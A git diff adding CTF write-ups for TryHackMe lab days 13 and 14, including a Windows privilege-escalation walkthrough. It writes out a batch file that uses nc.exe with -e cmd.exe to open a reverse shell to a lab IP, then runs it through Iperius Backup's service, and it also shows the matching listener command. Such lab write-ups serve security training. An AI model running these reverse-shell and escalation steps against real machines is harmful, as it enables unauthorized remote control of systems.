@@ -221,6 +221,139 @@ Answer:
 
 ## Day 13: They Lost The Plan!
 
+we have a windows server, open powershell and list all user
+
+```
+net users
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e44d79e2-bc54-4d88-b315-1f7f685fde5f)
+
+check the os version
+
+```
+systeminfo
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9cfb1373-553c-4480-a9e5-cc910b56c94c)
+
+list all running services
+
+```
+wmic service list | findstr "Backup"
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/36879f42-41ac-42c9-9d37-edf56aca59a3)
+
+create a reverse script on desktop as evil.bat
+
+```
+@echo off
+C:\Users\McSkidy\Downloads\nc.exe 10.10.108.203 1337 -e cmd.exe
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a12bc450-3a3d-4a27-9628-1cb92ad7b2f5)
+
+open Iperius Backup
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b1b4fd9d-2d31-49b0-81a8-1e80fbf66720)
+
+create new backup, you can create any backup and remember to choose destination
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5057942f-b710-492d-b805-942c80065340)
+
+on tab other process, choose run a program or external file, click ok
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e5a22764-e76b-4bdb-b4ae-c3c8fdb718a9)
+
+on our attack machine
+
+```
+nc -vlnp 1337
+```
+
+run the backup as service
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2527449f-41a3-4ce9-a3f3-3594755c8b5a)
+
+we got our shell
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4e553e22-b7be-4438-89b2-0a22e6fb1bda)
+
+```
+cd C:\Users\thegrinch\Documents
+type flag.txt
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/604f7d77-686b-45c7-bbdd-71ff055bc599)
+
+the Documents folder also contains a Schedule.txt, see it
+
+```
+dir
+type Schedule.txt
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c865ef69-e3db-4e07-abee-6e061f5300c9)
+
+Answer:
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/62c157af-f95f-4e9d-9c1d-5b95fc668bb8)
+
+## Day 14: Dev(Insecure)Ops
+
+dirb scan with its default wordlist
+
+```
+dirb machineip
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
